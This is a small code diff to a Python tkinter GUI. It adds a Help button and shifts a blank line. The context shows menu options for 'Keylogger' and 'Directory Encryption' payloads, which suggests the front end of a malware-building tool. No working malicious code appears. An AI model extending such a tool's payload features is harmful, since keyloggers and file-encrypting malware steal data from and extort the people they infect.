@@ -380,16 +380,20 @@ class GUI:
         malcombo = ttk.Combobox(frame, textvariable=curr_mal,width = 20) 
         malcombo['values'] = ('None', 'Keylogger', 'Directory Encryption') 
         malcombo.place(x=550,y=160)
-
         checkmalint = tkinter.IntVar()
         checkdevint = tkinter.IntVar()
         checkmal = tkinter.Checkbutton(frame, text='Malboy',variable=checkmalint, onvalue=1, offvalue=0)
         checkdev = tkinter.Checkbutton(frame, text='Devilinci',variable=checkdevint, onvalue=1, offvalue=0)
         checkmal.place(x=550,y=130)
         checkdev.place(x=675,y=130)
+
         #Go button
         gobutton = tkinter.Button(frame,text = "Go!", width = 8, height = 3,command=lambda:cls.go(finbox,malbox,malinp,checkdevint,checkmalint,curr_mal))
         gobutton.place(x=685,y=200)
+
+        #Help button
+        helpbutton = tkinter.Button(frame,text = "Help", width = 8,command=lambda:cls.help())
+        helpbutton.place(x=730,y=5)
 
         cls.gui.mainloop()
 
